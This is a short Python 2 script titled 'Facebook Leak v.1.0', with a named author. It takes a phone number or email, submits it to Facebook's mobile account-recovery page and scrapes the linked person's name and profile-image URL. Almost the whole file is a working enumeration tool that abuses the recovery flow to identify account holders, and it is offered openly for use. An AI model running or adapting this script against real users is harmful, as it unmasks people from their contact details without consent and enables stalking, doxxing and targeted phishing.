#!/usr/bin/python
# -*- coding: utf-8 -*-
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import urllib2
import urllib
from cookielib import CookieJar
import re
import os
os.system('clear')
print
print "Facebook Leak v.1.0 by x0n3-h4ck"
print "Coded by Corrado Liotta aka CorryL"
print "Info: corryl80@gmail.com"
print

email = raw_input ("Phone or Email: ")
print

cj = CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
values = "lsd=AVpaaUQL&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&email="+email+"&did_submit=Cerca"
response = opener.open("https://m.facebook.com/login/identify/?ctx=recover", values)
content = response.read()
risultato = re.findall(r'<strong>(.*?)</strong>',str(content))

print
print "Person:", risultato[0]

immagine = re.findall(r'<div class="s"><img src="(.*?)&amp;size=square',str(content))

print
print "Profile Image: ",immagine[0]
print

